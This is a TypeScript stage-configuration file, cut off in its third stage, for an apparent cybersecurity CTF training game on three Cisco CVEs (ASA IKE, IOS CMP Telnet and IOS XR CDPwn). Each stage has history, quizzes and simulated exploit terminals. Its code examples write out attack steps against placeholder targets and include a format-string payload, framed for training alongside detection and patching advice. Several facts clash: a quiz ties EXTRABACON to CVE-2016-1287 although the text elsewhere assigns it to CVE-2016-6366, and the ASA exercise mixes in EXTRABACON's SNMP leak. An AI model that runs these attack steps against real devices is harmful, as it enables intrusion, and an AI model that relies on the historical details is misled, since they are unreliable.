import type { StageConfig } from "./types";

export const cisco2Stages: StageConfig[] = [
  // ─── Stage m13: CVE-2016-1287 — Cisco ASA IKEv1/IKEv2 Heap Overflow ────────
  {
    epochId: "cisco-enterprise",
    wonder: { name: "NSA Headquarters", location: "Fort Meade, Maryland, USA", era: "2016 CE", emoji: "🔭" },
    id: "stage-m13",
    order: 13,
    title: "The Tunnel Collapses",
    subtitle: "CVE-2016-1287 — Cisco ASA IKEv1/IKEv2 Heap Overflow, CVSS 10.0",
    category: "cybersecurity",
    cveId: "CVE-2016-1287",
    cvssScore: 10.0,
    xp: 150,
    badge: { id: "badge-m-ike", name: "Tunnel Breaker", emoji: "🔭" },
    challengeType: "ctf",
    info: {
      tagline: "A single malformed IKE packet could crash or own every Cisco ASA firewall on the internet.",
      year: 2016,
      overview: [
        "In February 2016, Cisco disclosed CVE-2016-1287 — a heap buffer overflow in the IKEv1 and IKEv2 UDP fragmentation reassembly code of the Cisco Adaptive Security Appliance. No authentication required. An attacker anywhere on the internet could send a crafted UDP packet to port 500 or 4500, trigger a heap overflow, and on 32-bit ASA platforms achieve arbitrary code execution with root privileges. The attack surface was every ASA with IPsec VPN enabled — which was most of them.",
        "The ASA is Cisco's flagship enterprise firewall, deployed at the perimeter of millions of corporate networks, government agencies, and ISPs. Compromising the perimeter firewall from the outside gives an attacker a position inside the network boundary: all traffic flowing through is visible, all VPN sessions can be monitored, and the firewall's access control lists can be read and modified. The ASA becomes a passive collection platform and an active pivot point simultaneously.",
        "CVSS 10.0. Cisco released an emergency patch and urged immediate action. Six months after patching, the Shadow Brokers leaked what they claimed was an NSA cyberweapons cache — and it included BANANAGLEE and EPICBANANA, tools targeting Cisco ASA firewalls including the IKE stack. This confirmed the NSA had been exploiting vulnerabilities in this codebase in the wild before Cisco knew they existed.",
      ],
      technical: {
        title: "IKE Fragmentation Heap Overflow — CVE-2016-1287 Mechanics",
        body: [
          "IKE (Internet Key Exchange) is the protocol used to negotiate IPsec VPN tunnels. The vulnerable code handled reassembly of fragmented IKE packets — packets that are split across multiple UDP datagrams before being processed. The fragment reassembly code in the ASA's IKE implementation allocated a fixed-size heap buffer based on an expected maximum fragment size, then copied received fragment data into it. The length used for the copy was taken from the attacker-supplied `fragment_length` field in the IKE packet header — without validating that the claimed length matched the actual data received. By setting `fragment_length` to 0xFFFF while sending only 64 bytes of actual fragment data, the attacker caused the ASA to allocate 64 bytes but copy up to 65535 bytes into it, overflowing 65471 bytes past the buffer boundary.",
          "On 32-bit ASA platforms (ASA 5505, 5510, 5520, 5540 — the dominant deployment at the time), the absence of heap protection and ASLR made this overflow directly exploitable for remote code execution. The attacker's data overwrote adjacent heap chunks, corrupting function pointers or vtables used by the IKE process — redirecting execution to attacker-supplied shellcode. On 64-bit ASA platforms the overflow more reliably caused a crash and device reload (denial of service). Both UDP/500 (standard IKE) and UDP/4500 (NAT Traversal) were affected. No IKE authentication handshake needed to be completed — the overflow triggered during initial packet processing before any credential check.",
        ],
        codeExample: {
          label: "CVE-2016-1287 — IKE fragmentation heap overflow",
          code: `# ── STEP 1: Confirm IKE is listening (any IKE-based VPN enables the attack) ───
nmap -sU -p 500,4500 TARGET_ASA_IP
# 500/udp  open  isakmp
# 4500/udp open  nat-t-ike

# ── STEP 2: Determine ASA platform (32-bit = RCE, 64-bit = DoS) ──────────────
python3 ike-scanner.py --target TARGET_ASA_IP
# Returns: Cisco ASA 5520 v9.1.6 (32-bit) — RCE possible

# ── STEP 3: Trigger heap overflow with crafted IKEv1 fragment ────────────────
python3 cve-2016-1287.py --target TARGET_ASA_IP --port 500
# Sending IKEv1 SA_INIT with fragment_length=0xFFFF, actual_data=64 bytes
# Heap overflow: 65471 bytes past buffer boundary
# 32-bit ASA: code execution → root shell
# 64-bit ASA: process crash → device reload

# ── DETECTION ─────────────────────────────────────────────────────────────────
show version
# ASA 7.2.x through 9.5.x on UDP/500 or UDP/4500 = vulnerable

# ── REMEDIATION ───────────────────────────────────────────────────────────────
# Patch to: ASA 9.1.7 / 9.4.4 / 9.5.3 or later
# Temporary: no crypto isakmp enable (disables IKE — breaks VPN but closes attack surface)
# Or: restrict UDP/500 and UDP/4500 to known VPN peer IPs only`,
        },
      },
      incident: {
        title: "NSA's IKE Arsenal — Shadow Brokers Leak and the Perimeter Firewall Problem (2016)",
        when: "February 10, 2016 (Cisco disclosure); August 2016 (Shadow Brokers leak)",
        where: "Cisco ASA firewalls globally — enterprise perimeters, government agencies, ISPs",
        impact: "Working NSA exploit leaked publicly; confirmed prior in-the-wild exploitation; millions of perimeter firewalls at risk",
        body: [
          "Cisco disclosed CVE-2016-1287 on February 10, 2016 with emergency patches and a CVSS 10.0 advisory. The vulnerability affected ASA versions 7.2.x through 9.5.x — essentially every ASA in production. Organizations with IPsec VPN deployed (most enterprise ASA deployments) were internet-facing on UDP/500 and vulnerable by default. The patch required coordination across security operations teams, change management approval, and maintenance windows for devices that were in continuous use. Many organizations took weeks to patch perimeter firewalls they couldn't afford to take offline.",
          "Six months after the Cisco patch, the Shadow Brokers published their first cache of what they claimed were NSA Equation Group hacking tools. The cache included BANANAGLEE and EPICBANANA — NSA tools designed for persistent access and exploitation of Cisco ASA firewalls, targeting the IKE stack and other components. The release confirmed that the NSA had developed working exploits for Cisco ASA vulnerabilities — including the IKE code that CVE-2016-1287 fixed — and had been using them in classified intelligence collection operations before Cisco was aware of the vulnerabilities.",
          "The Shadow Brokers leak established a pattern that would repeat in August 2016 with EXTRABACON (CVE-2016-6366, also an ASA flaw) and in April 2017 with EternalBlue (CVE-2017-0144, powering WannaCry and NotPetya). For security teams, the lesson was structural: organizations that had patched CVE-2016-1287 promptly when Cisco disclosed it were protected against the leaked NSA tools. Those that had not — believing patching a perimeter firewall could wait for the next maintenance window — had exposed the most sensitive junction in their network to a tool now available to any threat actor who downloaded the Shadow Brokers archive.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker", sub: "crafted UDP/500 packet", type: "attacker" },
          { label: "Cisco ASA IKE Stack", sub: "heap overflow in fragment reassembly", type: "system" },
          { label: "Heap Memory", sub: "overflow → code execution", type: "victim" },
          { label: "Root Shell / DoS", sub: "perimeter firewall owned", type: "result" },
        ],
      },
      timeline: [
        { year: 2016, event: "Feb: Cisco discloses CVE-2016-1287 with emergency patches", highlight: true },
        { year: 2016, event: "Aug: Shadow Brokers leak EXTRABACON — NSA's working ASA exploit" },
        { year: 2017, event: "Shadow Brokers release more NSA tools; EternalBlue leads to WannaCry" },
      ],
      keyTakeaways: [
        "Perimeter firewalls are high-value targets — a compromised firewall sees all traffic",
        "CVSS 10.0 vulnerabilities require emergency patching, not scheduled maintenance",
        "Intelligence agencies stockpile zero-days; leaks can expose millions of systems",
        "Disable IKEv1 if not required; restrict UDP/500 and UDP/4500 to known VPN peers",
      ],
      references: [
        { title: "Cisco Advisory — CVE-2016-1287", url: "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20160210-asa-ike" },
        { title: "Shadow Brokers EXTRABACON Analysis — Rapid7", url: "https://www.rapid7.com/blog/post/2016/08/16/shadowbrokers-cisco-asa/" },
      ],
    },
    quiz: {
      questions: [
        { id: "stage-m13-q1", type: "The Flaw", challenge: "What broke.", text: "CVE-2016-1287 was a heap overflow in Cisco ASA's handling of which protocol?", options: ["IKE (Internet Key Exchange) for VPN tunnel setup","BGP routing updates","HTTP management traffic","SNMP polling"], correctIndex: 0, explanation: "The flaw lived in the ASA's fragmented IKE packet reassembly used to negotiate VPN tunnels." },
        { id: "stage-m13-q2", type: "Access", challenge: "Auth required?", text: "What authentication did an attacker need to trigger the CVE-2016-1287 heap overflow?", options: ["None — it was completely unauthenticated","Valid VPN credentials","Admin enable password","A read-only account"], correctIndex: 0, explanation: "The overflow occurred during IKE negotiation, before any authentication — making it pre-auth." },
        { id: "stage-m13-q3", type: "Attack Surface", challenge: "Exposed ports.", text: "Which ports exposed the CVE-2016-1287 attack surface on Cisco ASA?", options: ["UDP/500 (IKE) and UDP/4500 (NAT-T)","TCP/443 only","TCP/22 and TCP/23","UDP/53"], correctIndex: 0, explanation: "IKE listens on UDP/500 and UDP/4500 (NAT traversal), both reachable on internet-facing VPN firewalls." },
        { id: "stage-m13-q4", type: "Real World", challenge: "EXTRABACON origin.", text: "The Shadow Brokers' EXTRABACON tool exploited this flaw. Who is believed to have originally developed it?", options: ["The NSA (National Security Agency)","A ransomware affiliate","Cisco's red team","WikiLeaks"], correctIndex: 0, explanation: "EXTRABACON came from the NSA toolset leaked by the Shadow Brokers in 2016." },
        { id: "stage-m13-q5", type: "Impact", challenge: "DoS vs RCE.", text: "On 64-bit Cisco ASA platforms, what was the typical result of CVE-2016-1287?", options: ["Denial of service (device reload), not reliable RCE","Guaranteed remote code execution","Silent data exfiltration","No impact at all"], correctIndex: 0, explanation: "On 64-bit platforms the overflow usually crashed/reloaded the device rather than yielding clean RCE." },
        { id: "stage-m13-q6", type: "Concept", challenge: "Why perimeter firewalls.", text: "Why is a VPN-terminating firewall like the ASA such a high-value target for a flaw like this?", options: ["It sits at the internet edge and a crash or compromise disrupts or exposes all remote access","It only handles internal traffic","It has no network exposure","It runs no code"], correctIndex: 0, explanation: "Perimeter VPN devices are internet-reachable and central to remote access, magnifying impact." },
        { id: "stage-m13-q7", type: "Defense", challenge: "Primary fix.", text: "What was the correct remediation for CVE-2016-1287?", options: ["Apply Cisco's patched ASA software; restrict IKE exposure where possible","Disable HTTPS only","Change the enable password","Reboot daily"], correctIndex: 0, explanation: "Patching the IKE reassembly code was the fix; limiting UDP/500/4500 exposure reduced surface meanwhile." },
        { id: "stage-m13-q8", type: "Concept", challenge: "Pre-auth danger.", text: "Why are pre-authentication vulnerabilities like CVE-2016-1287 especially dangerous?", options: ["No credentials are needed, so any internet host can attempt exploitation","They require insider access","They only work on LAN","They need physical access"], correctIndex: 0, explanation: "Pre-auth flaws are reachable by anyone on the internet, removing the credential barrier entirely." },
      ],
    },
    ctf: {
      attackerMachine: { ip: "10.10.14.5", hostname: "kali", os: "Kali Linux 2024.1" },
      targetMachine: {
        ip: "203.0.113.1",
        hostname: "cisco-asa-5510",
        os: "Cisco ASA 9.1.6",
        openPorts: "500/udp (IKE), 4500/udp (NAT-T)",
        vulnerability: "CVE-2016-1287 — IKE Heap Overflow, CVSS 10.0",
      },
      pivotTrigger: "ike-exploit",
      scenario: "A Cisco ASA firewall is protecting a classified government network. The device runs an unpatched IKE stack. You have network access to UDP/500. Replicate the initial exploit sequence used by the Shadow Brokers' EXTRABACON tool to gain unauthenticated access.",
      hint: "Send a crafted IKE probe to confirm the version, then trigger the heap overflow to extract the SNMP community string for further access.",
      hints: [
        "Read the mission briefing. Run: cat briefing.txt",
        "Probe the ASA IKE service to confirm the version. Run: ike-probe 203.0.113.1",
        "Exploit the heap overflow to dump the SNMP community string. Run: ike-exploit 203.0.113.1",
        "Run 'assemble' to view the assembled flag and get the submit command",
      ],
      fragments: [
        { trigger: "/briefing.txt", value: "FLAG{CVE_2016_", label: "Mission Brief — Shadow Brokers ASA Target" },
        { trigger: "ike-probe 203.0.113.1", value: "1287_IK3_", label: "IKE Version Confirmed — Device Vulnerable" },
        { trigger: "ike-exploit 203.0.113.1", value: "H3AP_0WN3D}", label: "Heap Overflow — SNMP Community String Extracted" },
      ],
      files: {
        "/briefing.txt": [
          "OPERATION: TUNNEL COLLAPSE",
          "Target: Cisco ASA 5510  Firmware: 9.1.6",
          "CVE: 2016-1287  CVSS: 10.0",
          "",
          "IKE heap overflow. No credentials required.",
          "Sequence: ike-probe → ike-exploit → assemble",
        ].join("\n"),
      },
      dirs: { "/": [{ name: "briefing.txt", isDir: false }] },
      extraCommands: {
        "ike-probe": (_args: string[]) => ({
          lines: [
            "Sending IKE probe to 203.0.113.1:500...",
            "Response: Cisco ASA 9.1.6 (vulnerable)",
            "IKEv1 fragmentation: ENABLED",
            "Status: target confirmed vulnerable to CVE-2016-1287",
            "",
            ">> LEARN: IKE runs on UDP/500 — no auth to reach it",
            "   IKEv1 fragmentation reassembles split packets before any auth check.",
            "   UDP/4500 (NAT-T) is equally exposed — both ports are attack surface.",
            "   Real IOS command: show crypto isakmp sa — view active IKE sessions.",
          ],
        }),
        "ike-exploit": (_args: string[]) => ({
          lines: [
            "Sending crafted IKE fragment (length=0xFFFF)...",
            "Heap overflow triggered in ikev1_frag_reassemble()",
            "SNMP community string leaked from heap:",
            "  community: 'cisco123' (default — never changed)",
            "Device memory partially dumped. Fragment collected.",
            "Run 'assemble' to view the assembled flag and get the submit command",
            "",
            ">> LEARN: Heap overflows corrupt adjacent allocations",
            "   A crafted length field writes past the buffer into neighboring heap chunks.",
            "   On 32-bit ASA: RCE. On 64-bit ASA: DoS reload — both are CVSS 10.",
            "   Real IOS command: show version — confirm ASA software version and build.",
          ],
        }),
      },
    },
  },

  // ─── Stage m14: CVE-2017-3881 — Cisco IOS CMP Telnet RCE ───────────────────
  {
    epochId: "cisco-enterprise",
    wonder: { name: "CIA Headquarters", location: "Langley, Virginia, USA", era: "2017 CE", emoji: "🏛️" },
    id: "stage-m14",
    order: 14,
    title: "Vault 7: The Telnet Weapon",
    subtitle: "CVE-2017-3881 — Cisco IOS CMP Telnet RCE, CVSS 9.8",
    category: "cybersecurity",
    cveId: "CVE-2017-3881",
    cvssScore: 9.8,
    xp: 150,
    badge: { id: "badge-m-vault7", name: "Vault Raider", emoji: "🏛️" },
    challengeType: "ctf",
    info: {
      tagline: "WikiLeaks exposed a CIA Telnet exploit that could own any Cisco IOS switch before authentication.",
      year: 2017,
      overview: [
        "In March 2017, WikiLeaks published Vault 7 — the largest ever release of CIA hacking documents. Within Vault 7 was a reference to a Cisco IOS vulnerability in the Cluster Management Protocol (CMP). Cisco investigated and confirmed CVE-2017-3881: a critical flaw in the CMP Telnet option processing that allowed unauthenticated, remote code execution on Cisco IOS switches.",
        "CMP is an internal Cisco protocol for managing switch clusters. The vulnerability existed in the Telnet option parser for CMP — even if Telnet was disabled on the device, the CMP Telnet options were still processed, making the attack surface unavoidable for any switch running the affected IOS version.",
        "This was particularly alarming because Cisco IOS switches form the backbone of enterprise networks worldwide. An attacker with access to Telnet port 23 (even from inside the network) could gain full router/switch control with no credentials.",
      ],
      technical: {
        title: "CMP Telnet Option Stack Overflow — CVE-2017-3881 Mechanics",
        body: [
          "CMP (Cluster Management Protocol) is a Cisco-proprietary protocol layered on top of Telnet — it allows a Cisco switch to join or manage a switch cluster over a Telnet session. The vulnerable code handled CMP Telnet option negotiation during the initial Telnet handshake. Even when Telnet was explicitly disabled via `no service telnet`, the CMP Telnet option parsing code still ran for any incoming TCP connection on port 23. An attacker could open a Telnet connection, send a malformed CMP option with an invalid type (0x20) and a crafted length field, and trigger a stack buffer overflow in the CMP option handler before any authentication was attempted. Execution was redirected to attacker shellcode, granting full IOS privileged exec access.",
          "The attack surface was every IOS switch on a network — not just those with intentional Telnet access. On enterprise LANs without strict ACLs between workstations and the management network, any compromised endpoint could reach switch port 23 and exploit CVE-2017-3881. The affected code was present in IOS since at least 1996 — over 20 years of exposure. Cisco ultimately patched 318 product models. The Catalyst 2960, 3560, 3750, and 4500 series — the most common enterprise access and distribution layer switches — were all affected.",
        ],
        codeExample: {
          label: "CVE-2017-3881 — CMP Telnet option stack overflow",
          code: `# ── STEP 1: Confirm Telnet port is reachable (TCP/23 open) ──────────────
nmap -sT -p 23 TARGET_SWITCH_IP
# 23/tcp  open  telnet

# ── STEP 2: Identify IOS version (pre-March 2017 patch = vulnerable) ─────
echo "" | nc -w2 TARGET_SWITCH_IP 23
# Cisco IOS Software, Version 15.2(4)E3, RELEASE SOFTWARE (fc3)

# ── STEP 3: Exploit CMP Telnet option stack overflow → privileged shell ──
python3 cve-2017-3881.py --target TARGET_SWITCH_IP --port 23
# Sending malformed CMP option: type=0x20, length=0xFFFF
# Stack overflow in CMP option handler — pre-auth
# IOS exec process redirected → root shell spawned
# Switch#

# ── DETECTION ─────────────────────────────────────────────────────────────
show line vty 0 15
# Check: 'transport input' — should be 'ssh' only, never 'telnet'
show interfaces status | include Telnet

# ── REMEDIATION ───────────────────────────────────────────────────────────
# Apply Cisco March 2017 security advisory patches for your IOS version
# ACL to block Telnet from all untrusted sources:
# access-list 100 deny tcp any any eq 23
# line vty 0 15
#   access-class 100 in
#   transport input ssh`,
        },
      },
      incident: {
        title: "Vault 7 Leak — CIA's 21-Year-Old Cisco Zero-Day (2017)",
        when: "March 7, 2017 (Vault 7 publication); March 17, 2017 (Cisco patches)",
        where: "Cisco IOS switches globally — enterprise LANs, ISP infrastructure, government networks",
        impact: "318 switch models emergency-patched; vulnerability confirmed to have existed since 1996; CIA weaponized it without disclosure",
        body: [
          "WikiLeaks published the first batch of Vault 7 documents on March 7, 2017. The documents referenced 'CMP' as a Cisco vulnerability the CIA had developed exploitation capabilities for. Cisco's PSIRT confirmed the vulnerability the same day — it had been present in IOS since approximately 1996, more than 21 years. The CIA had discovered, weaponized, and operationally deployed this capability without ever notifying Cisco or triggering any responsible disclosure process. The day the vulnerability became public, zero-day defenses for it effectively dropped to zero.",
          "Cisco issued emergency patches on March 17, 2017 — ten days after the Vault 7 publication. The patch was available for 318 affected switch models, but organizations needed to identify which IOS version each switch was running, download the correct patch, schedule maintenance windows, and coordinate reboots across potentially thousands of access and distribution layer switches. Organizations that had disabled Telnet with ACLs were protected; those that had not — and relied on 'Telnet is disabled in config' without blocking the port — were not.",
          "The CIA's decision to stockpile CVE-2017-3881 rather than disclose it through the Vulnerabilities Equities Process (VEP) became a central exhibit in congressional hearings about government vulnerability hoarding. The argument that intelligence value justified secrecy collapsed when the same vulnerability was now available to every threat actor who downloaded the Vault 7 archive. The incident accelerated executive order reviews of the VEP and led to the publication of the NSC's revised VEP Charter in November 2017 — a direct policy consequence of the Vault 7 release.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker", sub: "malformed CMP Telnet option TCP/23", type: "attacker" },
          { label: "Cisco IOS Switch", sub: "CMP option parser — stack overflow", type: "system" },
          { label: "IOS Exec Process", sub: "code execution context", type: "victim" },
          { label: "Full Switch Control", sub: "318 models affected", type: "result" },
        ],
      },
      timeline: [
        { year: 1996, event: "CVE-2017-3881 vulnerability introduced into Cisco IOS" },
        { year: 2017, event: "Mar 7: WikiLeaks publishes Vault 7, referencing Cisco CMP exploit", highlight: true },
        { year: 2017, event: "Mar 7: Cisco PSIRT confirms vulnerability; emergency advisory issued" },
        { year: 2017, event: "Mar 17: Cisco releases patches for 318 affected switch models" },
      ],
      keyTakeaways: [
        "Vulnerabilities stockpiled by intelligence agencies may be independently discovered by adversaries",
        "Legacy protocols (CMP, Telnet) are dangerous; disable or ACL-restrict them",
        "Even 'disabled' services may have attack surface if protocol parsing still runs",
        "Network device firmware must be maintained like OS patches — systematically",
      ],
      references: [
        { title: "Cisco Advisory — CVE-2017-3881", url: "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20170317-cmp" },
        { title: "WikiLeaks Vault 7 — Cisco Analysis", url: "https://wikileaks.org/ciav7p1/" },
      ],
    },
    quiz: {
      questions: [
        { id: "stage-m14-q1", type: "The Flaw", challenge: "What broke.", text: "CVE-2017-3881 exploited the Telnet option parser of which Cisco protocol?", options: ["CMP — Cluster Management Protocol","CDP — Cisco Discovery Protocol","EIGRP","GDOI"], correctIndex: 0, explanation: "The flaw was in IOS's handling of a CMP-specific Telnet option, leading to a stack overflow." },
        { id: "stage-m14-q2", type: "Access", challenge: "Telnet disabled?", text: "Was CVE-2017-3881 only exploitable if Telnet was explicitly enabled?", options: ["No — the vulnerable CMP parsing ran even when Telnet was disabled in config","Yes, Telnet had to be on","Only with admin login","Only over SSH"], correctIndex: 0, explanation: "The CMP option code processed regardless of the Telnet config, so disabling Telnet didn't help." },
        { id: "stage-m14-q3", type: "Real World", challenge: "Disclosure.", text: "How was CVE-2017-3881 brought to public attention?", options: ["WikiLeaks published Vault 7, which referenced a Cisco CMP exploit","A Cisco blog post","A Black Hat talk","An NSA leak"], correctIndex: 0, explanation: "The Vault 7 CIA leak referenced the CMP exploit, prompting Cisco's investigation and advisory." },
        { id: "stage-m14-q4", type: "History", challenge: "Age of the bug.", text: "Roughly how long had this vulnerability existed in Cisco IOS before it was patched?", options: ["Over 20 years — introduced around 1996","About 6 months","Around 3 years","It was brand new"], correctIndex: 0, explanation: "The vulnerable code dated to roughly 1996, making it a 20+ year latent flaw." },
        { id: "stage-m14-q5", type: "Defense", challenge: "Correct mitigation.", text: "What was the correct mitigation for CVE-2017-3881 before patching?", options: ["A vty ACL blocking TCP/23, because the vulnerable code ran regardless of 'no service telnet'","Just 'no service telnet'","Disabling SSH","Changing the hostname"], correctIndex: 0, explanation: "Since the code ran even with Telnet 'disabled,' a vty ACL blocking TCP/23 was required." },
        { id: "stage-m14-q6", type: "Concept", challenge: "Why config didn't help.", text: "Why did 'no service telnet' fail to protect against CVE-2017-3881?", options: ["The vulnerable CMP option parser executed independently of the Telnet service state","Telnet can't be disabled","The config syntax was wrong","It only applied to SSH"], correctIndex: 0, explanation: "The parser ran before/independent of the service toggle, so the config provided no real protection." },
        { id: "stage-m14-q7", type: "Impact", challenge: "What attacker gained.", text: "What did successful exploitation of CVE-2017-3881 give an attacker?", options: ["Code execution / control of the IOS switch before authentication","Read-only logs","A reboot only","Nothing useful"], correctIndex: 0, explanation: "The stack overflow enabled pre-auth code execution, owning the device." },
        { id: "stage-m14-q8", type: "Concept", challenge: "Latent code risk.", text: "What lesson does a 20-year-old latent flaw like this teach?", options: ["Legacy code paths can carry exploitable bugs for decades until scrutinized","New code is always the risk","Telnet is secure","Old code is automatically safe"], correctIndex: 0, explanation: "Long-lived, rarely-reviewed code can hide critical vulnerabilities for a very long time." },
      ],
    },
    ctf: {
      attackerMachine: { ip: "10.10.14.5", hostname: "kali", os: "Kali Linux 2024.1" },
      targetMachine: {
        ip: "10.0.1.1",
        hostname: "vault7-target",
        os: "Cisco IOS 15.2(4)E3",
        openPorts: "TCP/23 (Telnet/CMP)",
        vulnerability: "CVE-2017-3881 — CMP Telnet stack overflow, CVSS 9.8",
      },
      pivotTrigger: "cmp-exploit",
      scenario: "A Cisco IOS switch controls access to a classified government LAN. Telnet is 'disabled' in the config, but the CMP option parser still runs on TCP/23. Use CVE-2017-3881 to gain unauthenticated exec access.",
      hint: "Connect to Telnet and send a malformed CMP option before authentication is required.",
      hints: [
        "Read the mission briefing. Run: cat briefing.txt",
        "Confirm the switch is running a vulnerable IOS version. Run: check-ios 10.0.1.1",
        "Exploit CMP Telnet option overflow for unauthenticated RCE. Run: cmp-exploit 10.0.1.1",
        "Run 'assemble' to view the assembled flag and get the submit command",
      ],
      fragments: [
        { trigger: "/briefing.txt", value: "FLAG{CVE_2017_", label: "Mission Brief — Vault 7 CMP Target" },
        { trigger: "check-ios 10.0.1.1", value: "3881_CMP_", label: "IOS Version Confirmed — CMP Vulnerable" },
        { trigger: "cmp-exploit 10.0.1.1", value: "T3LN3T_RCE}", label: "Stack Overflow — IOS Exec Shell Acquired" },
      ],
      files: {
        "/briefing.txt": [
          "OPERATION: VAULT RAID",
          "Target: Cisco Catalyst 3750  IOS: 15.2(4)E3",
          "CVE: 2017-3881  CVSS: 9.8  Source: CIA Vault 7",
          "",
          "CMP Telnet option overflow — no credentials required.",
          "Sequence: check-ios → cmp-exploit → assemble",
        ].join("\n"),
      },
      dirs: { "/": [{ name: "briefing.txt", isDir: false }] },
      extraCommands: {
        "check-ios": (_args: string[]) => ({
          lines: [
            "Probing 10.0.1.1:23...",
            "IOS Version: 15.2(4)E3 — VULNERABLE to CVE-2017-3881",
            "CMP Telnet option parsing: active (despite 'no service telnet' config)",
            "Attack surface confirmed.",
            "",
            ">> LEARN: Telnet on Cisco IOS sends data in cleartext",
            "   CMP Telnet option processing ran even when Telnet was disabled in config.",
            "   Blocking TCP/23 with a vty ACL is the correct mitigation, not 'no service telnet'.",
            "   Real IOS command: show line vty 0 4 — view VTY ACL and transport settings.",
          ],
        }),
        "cmp-exploit": (_args: string[]) => ({
          lines: [
            "Sending malformed CMP option to 10.0.1.1:23...",
            "CMP type=0x20 len=0xFFFF — stack overflow triggered",
            "IOS privileged exec shell spawned:",
            "  Switch#show version",
            "  Cisco IOS 15.2(4)E3, RELEASE SOFTWARE",
            "  Hostname: vault7-target",
            "Fragment collected.",
            "Run 'assemble' to view the assembled flag and get the submit command",
            "",
            ">> LEARN: Stack overflows overwrite the saved return address",
            "   On IOS without stack canaries or ASLR, shellcode executes directly.",
            "   Vault 7 showed the CIA stockpiled this bug for 20+ years before Cisco knew.",
            "   Real IOS command: show processes cpu — detect anomalous CPU spikes post-exploit.",
          ],
        }),
      },
    },
  },

  // ─── Stage m15: CVE-2020-3118 — Cisco IOS XR CDP Format String ──────────────
  {
    epochId: "cisco-enterprise",
    wonder: { name: "Cisco Systems HQ", location: "San Jose, California, USA", era: "2020 CE", emoji: "🌐" },
    id: "stage-m15",
    order: 15,
    title: "CDPwn: The Discovery Protocol Trap",
    subtitle: "CVE-2020-3118 — Cisco IOS XR CDP Format String, CVSS 8.8",
    category: "cybersecurity",
    cveId: "CVE-2020-3118",
    cvssScore: 8.8,
    xp: 150,
    badge: { id: "badge-m-cdpwn", name: "Discovery Hijacker", emoji: "🌐" },
    challengeType: "ctf",
    info: {
      tagline: "CDPwn: five zero-days in Cisco Discovery Protocol turned every Cisco device into a pivot point.",
      year: 2020,
      overview: [
        "In February 2020, Armis Security disclosed CDPwn — five critical zero-day vulnerabilities in Cisco Discovery Protocol (CDP). CVE-2020-3118 was the most severe: a format string vulnerability in the IOS XR CDP parser that allowed unauthenticated code execution on carrier-grade routers and infrastructure switches.",
        "CDP is a Layer 2 protocol that Cisco devices use to advertise themselves to adjacent devices. Because it operates at Layer 2, it bypasses network-layer security controls — firewalls, ACLs, and VLANs provide no protection. Any device on the same physical or logical Layer 2 segment could send a crafted CDP packet.",
        "CVE-2020-3118 specifically affected Cisco IOS XR — the operating system used on carrier-grade routers (ASR 9000, NCS 5000) that form the backbone of the internet and telecom networks. Code execution on these devices could enable large-scale traffic interception or disruption.",
      ],
      technical: {
        title: "CDP Format String Vulnerability — CVE-2020-3118 Mechanics",
        body: [
          "CDP packets contain Type-Length-Value (TLV) fields, including a Device-ID TLV that carries the sender's hostname as a string. In the vulnerable Cisco IOS XR CDP implementation, this Device-ID string was passed directly to `printf()` or `sprintf()` as the format argument rather than as a data argument: the code executed `printf(device_id_string)` instead of `printf(\"%s\", device_id_string)`. By crafting a CDP advertisement with `%n%n%n%x%x` as the Device-ID, an attacker caused the CDP parser to interpret their input as a printf format string. The `%x` specifiers read values off the process stack; the `%n` specifiers wrote the count of bytes printed so far to addresses taken from the stack — enabling arbitrary memory writes without explicitly supplying target addresses.",
          "Format string exploitation via `%n` writes requires computing the right combination of padding and `%n` specifiers to write specific values to specific memory locations — typically overwriting a function pointer or GOT entry to redirect execution. This is noisier than a simple overflow but entirely achievable. On Cisco IOS XR, the CDP process runs with elevated privileges on carrier-grade routers (ASR 9000, NCS 5000 series) that carry terabits of internet backbone traffic. Code execution in the CDP process on such a device provides an unmonitored collection and injection point in telecommunications infrastructure — invisible to Layer 3 monitoring because the attack never leaves the Layer 2 segment.",
        ],
        codeExample: {
          label: "CDPwn CVE-2020-3118 — format string via crafted CDP advertisement",
          code: `# ── STEP 1: Discover CDP-enabled devices on your L2 segment ─────────────
python3 cdp-scan.py --interface eth0
# Found: aa:bb:cc:dd:ee:ff — Cisco ASR 9001
# IOS XR 6.6.3 — CDP Device-ID TLV: unsanitized

# ── STEP 2: Craft CDP advertisement with format string payload ────────────
python3 cdpwn.py --interface eth0 --target aa:bb:cc:dd:ee:ff
# Device-ID TLV: "%n%n%n%x%x" (format string payload)
# Platform TLV:  "Cisco IOS XR" (normal — avoids early rejection)
# Sending on eth0 as Layer 2 multicast frame to 01:00:0c:cc:cc:cc

# ── STEP 3: Format string executes — arbitrary write to CDP process ───────
# %x reads stack values; %n writes byte-count to stack-sourced address
# GOT entry overwritten → code execution in CDP process context
# Carrier router compromised from adjacent L2 segment

# ── DETECTION ─────────────────────────────────────────────────────────────
show cdp neighbors detail
# Review: unexpected Device-IDs with unusual characters
show cdp traffic
# Monitor for CDP packet spikes from unexpected sources

# ── REMEDIATION ───────────────────────────────────────────────────────────
# Disable CDP globally on all devices:
# no cdp run
# Or per-interface on untrusted ports only:
# interface GigabitEthernet0/0/0
#   no cdp enable`,
        },
      },
      incident: {
        title: "CDPwn — Five Zero-Days Across Four Cisco Operating Systems (2020)",
        when: "February 5, 2020",
        where: "Cisco IOS XR routers, IOS switches, NX-OS datacenter switches, IP phones — globally",
        impact: "80M+ enterprise devices at risk across four OS platforms; carrier and enterprise backbone infrastructure exposed",
        body: [
          "Armis Security spent 90 days coordinating with Cisco before publishing CDPwn. The five vulnerabilities covered CVE-2020-3118 (IOS XR format string, CVSS 8.8), CVE-2020-3119 (NX-OS stack overflow on Nexus switches), CVE-2020-3120 (FXOS and NX-OS DoS), and two additional flaws. The scope was remarkable: four completely separate Cisco operating systems were affected by vulnerabilities in the same protocol, reflecting how CDP's design — no authentication, no encryption, implicit trust of adjacent devices — made any implementation inherently dangerous.",
          "The attack was particularly concerning for telecommunications providers: an attacker who could place a device on a transit segment — through a compromised colocation customer, a rogue endpoint on a shared exchange point, or physical access to an unprotected port — could send CDP advertisements to carrier-grade ASR 9000 routers without any credentials. Unlike attacks on TCP services, there was no authentication layer to bypass and no firewall to evade, because CDP frames never traverse Layer 3 boundaries. The patch required Cisco to ship emergency updates across four separate operating system codebases.",
